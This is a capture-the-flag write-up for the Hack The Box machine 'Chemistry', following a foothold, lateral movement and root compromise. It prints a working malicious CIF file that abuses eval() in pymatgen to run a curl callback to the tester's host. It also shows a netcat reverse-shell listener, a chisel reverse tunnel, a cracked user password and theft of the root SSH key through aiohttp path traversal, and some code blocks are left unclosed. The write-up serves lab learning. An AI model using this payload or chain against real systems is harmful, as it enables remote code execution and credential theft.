## Description:

This machine is a Easy linux machine, The machine is exploited by taking advantage of a vulnerability in the `pymatgen` library, where the `JonesFaithfulTransformation.from_transformation_str()` method improperly uses `eval()`, allowing code execution through a crafted CIF file. This leads to initial access, from which the attacker retrieves a database containing the user `rosa`'s password hash. Following this, an LFI vulnerability is exploited to obtain the SSH private key (`id_rsa`) of the root user, ultimately granting full root access to the system.

#### Difficulty: `easy`

# Part 1: Enumeration & Foothold

## Enumeration

- Nmap finds two open TCP ports, SSH (22) and UPNP (5000)

```bash

## Foothold

### Website TCP 5000

- Site
![site](/assets/blog/htb-chemistry/site_img.png)

- Thereâ€™s not much here without a login, but I can register an account and login:
- We saw that we can upload a cif file

![dashboard](/assets/blog/htb-chemistry/dashboard.png)

- Trying to do some file upload bypass did not give anything correct, but there is an example cif file format we can download on the path /static/example.cif
- From there I stumbled upon a vulnerable python lib used using a simple google search. We came across a critical security vulnerability in the `JonesFaithfulTransformation.from_transformation_str()` method within the `pymatgen` library. This method insecurely utilizes eval() for processing input, enabling execution of arbitrary code when parsing untrusted input. This can be exploited when parsing a maliciously-created CIF file.
- From there we created the vulnerable file and uploaded it to the server:

```bash
data_5yOhtAoR
_audit_creation_date            2018-06-08
_audit_creation_method          "Pymatgen CIF Parser Arbitrary Code Execution Exploit"

loop_
_parent_propagation_vector.id
_parent_propagation_vector.kxkykz
k1 [0 0 0]

_space_group_magn.transform_BNS_Pp_abc  'a,b,[d for d in ().__class__.__mro__[1].__getattribute__ ( *[().__class__.__mro__[1]]+["__sub" + "classes__"] ) () if d.__name__ == "BuiltinImporter"][0].load_module ("os").system ("curl 10.10.14.176");0,0,0'

_space_group_magn.number_BNS  62.448
_space_group_magn.name_BNS  "P  n'  m  a'  "
```

- In this exploit, we make a curl to our webserver to check if there is a callback from the server:
![exploit1](/assets/blog/htb-chemistry/exploit1.png)

- Upon trying to view the document, we observe an internal server error. Checking my webserver i received a callback hence code execution on this machine:

![web_callback](/assets/blog/htb-chemistry/web_callback.png)

### Shell as app

- We created 3 CIF files containing a stager, a file that made the shell.sh executable, and the third file that executes the shell.sh:

```bash
[ðŸ”´][Oct 20, 2024 - 20:57:39 (CEST)] exegol-htb chemistry # rlwrap -cAr nc -lvnp 443

python3 -c 'import pty; pty.spawn("/bin/bash")'
app@chemistry:~$ ls
ls
app.py  instance  shell.sh  static  templates  uploads
app@chemistry:~$
```

# Part 2: Lateral Movement & Privilege Escalation

## Lateral Movement

- After we obtained our rev shell, a quick search through the file directories revealed a database.db file. Downloading the file showed it contained credentials:

![dashboard_db](/assets/blog/htb-chemistry/dashboard_db.png)

![db_content](/assets/blog/htb-chemistry/db_content.png)

- Collected all the hashes and cracked them with CrackStation for simplicity. From there, we got a valid user called rosa with her password `unicorniosrosados`, and we retrieved the user flag:

![rosa_ssh](/assets/blog/htb-chemistry/rosa_ssh.png)
## Privilege Escalation

### Shell as rosa

- Running `netstat -a` reveals port 8080:

```bash
rosa@chemistry:~$ netstat -a
Active Internet connections (servers and established)
Proto Recv-Q Send-Q Local Address           Foreign Address         State
tcp        0      0 0.0.0.0:5000            0.0.0.0:*               LISTEN
tcp        0      0 localhost:http-alt      0.0.0.0:*               LISTEN
tcp        0      0 localhost:domain        0.0.0.0:*               LISTEN

```


- Iâ€™ll connect from the chemistry box, tunneling port 8001 on
- I use `-p 8000` to listen on 8000 (the default port of 8080 is already in use by Burp), and give it `--reverse` to allow incoming connections to open listeners on my host that tunnel back through them.

```bash
[ðŸ”´][Oct 20, 2024 - 18:02:35 (CEST)] exegol-htb chemistry # chisel   server -p 8000 --reverse
2024/10/20 18:04:08 server: Reverse tunnelling enabled
2024/10/20 18:04:08 server: Fingerprint etiZL+Qj2dflGx8xX/U+z6vvE6Q3aiq2SWQi2PAws1g=
2024/10/20 18:04:08 server: Listening on http://0.0.0.0:8000
2024/10/20 18:07:13 server: session#1: tun: proxy#R:8001=>8080: Listening

```

- Iâ€™ll connect from chemistry box, tunneling port 8001 on my host through the tunnel to 8000 on chemistry:

```bash
rosa@chemistry:~$ ./chisel client 10.10.14.176:8000 R:8001:127.0.0.1:8080 &
[2] 2105
rosa@chemistry:~$ 2024/10/20 19:33:09 client: Connecting to ws://10.10.14.176:8000
2024/10/20 19:33:09 client: Connected (Latency 37.877078ms)
```

Site
- Visiting the website on [`http://127.0.0.1:8001`](http://127.0.0.1:8001) shows another website

![internal_service](/assets/blog/htb-chemistry/internal_service.png)

- Fuzzing through the web directories we observe that the assets directory is present but forbidden
- From here using burp we actually notice the server is a pyhton3,9 aiohttp/3.9.1

![aiohttp](/assets/blog/htb-chemistry/aiohttp.png)

- This aio http server version is actually vulnerable to PAth traversal vulnerability,

The root cause of this vulnerability lies in the way aiohttp handles static file serving when follow_symlinks is enabled. This setting allows aiohttp to follow symbolic links (symlinks) during file serving, which can be exploited by attackers to navigate to arbitrary locations on the system.

![symlinks](/assets/blog/htb-chemistry/symlinks.png)

- This confirms the vulnerability from here checking through files we could read the root flag

![root_flag](/assets/blog/htb-chemistry/root_flag.png)

### Shell as root
- Furthermore to get access to the machine we used the same method to get the root id_rsa private key file and could connect through ssh and finally as root

```bash
[ðŸ”´][Oct 20, 2024 - 22:08:44 (CEST)] exegol-htb chemistry # ssh root@10.129.124.136 -i id_rsa

## Conclusion

This machine highlights vulnerabilities in library usage (eval in pymatgen), local file inclusions, and symlink handling in web servers. Proper coding practices, such as avoiding eval() and securing static file serving, could have mitigated these vulnerabilities.
